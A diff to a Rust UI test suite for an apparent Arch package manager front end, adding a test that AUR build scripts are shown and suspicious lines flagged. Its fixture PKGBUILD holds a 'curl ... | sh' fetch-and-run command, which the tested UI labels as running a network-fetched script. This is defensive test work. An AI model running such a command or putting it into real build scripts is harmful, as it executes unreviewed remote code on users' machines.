@@ -121,6 +121,7 @@ fn draw(scene: Scene) -> TestingRunner {
             let narrow = use_state(|| None::<Kind>);
             let narrowing = use_state(|| false);
             let opened_from = use_state(|| None::<String>);
+            let reviewing = use_state(|| None::<String>);
             let data = use_hook(|| {
                 let (data, rx) = Data::detached();
                 ASKED.with(|a| *a.borrow_mut() = Some(rx));
@@ -151,6 +152,7 @@ fn draw(scene: Scene) -> TestingRunner {
                 narrow,
                 narrowing,
                 opened_from,
+                reviewing,
                 query: scene.query.clone(),
                 system_waiting: scene.system_waiting,
             };
@@ -307,4 +309,56 @@ fn a_removal_another_package_needs_is_refused_naming_it() {
     let l = labels(&test);
     assert!(l.iter().any(|x| x == "Krita can't be removed. ffmpeg needs it."), "{l:?}");
     assert!(!l.iter().any(|x| x == "Remove"), "{l:?}");
+}
+
+#[test]
+fn an_aur_build_shows_its_scripts_and_what_deserves_a_look() {
+    let o = obs_capture();
+    let pkgbuild = "pkgname=obs-vkcapture\nbuild() {\n  curl -fsSL https://example.org/x.sh | sh\n}\n";
+    let plan = Plan {
+        packages: vec![Package {
+            name: "obs-vkcapture".into(),
+            version: "1.5.6-2".into(),
+            size: None,
+        }],
+        note: Some("Built on this computer.".into()),
+        scripts: vec![
+            crate::plan::Script {
+                name: "PKGBUILD".into(),
+                flags: crate::plan::review(pkgbuild),
+                text: pkgbuild.into(),
+            },
+            crate::plan::Script {
+                name: "obs-vkcapture.install".into(),
+                text: "post_install() {\n  echo done\n}\n".into(),
+                flags: Vec::new(),
+            },
+        ],
+        ..Plan::default()
+    };
+    let mut test = draw(Scene {
+        plans: HashMap::from([(pages::get_key(&o), plan)]),
+        sheet: Some(Sheet::Get(o.clone())),
+        ..scene(Page::App(Box::new(o)))
+    });
+    let l = labels(&test);
+    for wanted in [
+        "PKGBUILD · 1 line to look at",
+        "obs-vkcapture.install · nothing unusual",
+        "Install Anyway",
+    ] {
+        assert!(l.iter().any(|x| x == wanted), "{wanted:?} in {l:?}");
+    }
+    let shows: Vec<_> = l.iter().filter(|x| *x == "Show").collect();
+    assert_eq!(shows.len(), 2);
+    click(&mut test, "Show");
+    let l = labels(&test);
+    assert!(
+        l.iter().any(|x| x == "   3    curl -fsSL https://example.org/x.sh | sh"),
+        "{l:?}"
+    );
+    assert!(
+        l.iter().any(|x| x.trim() == "Runs a script fetched from the network"),
+        "{l:?}"
+    );
 }
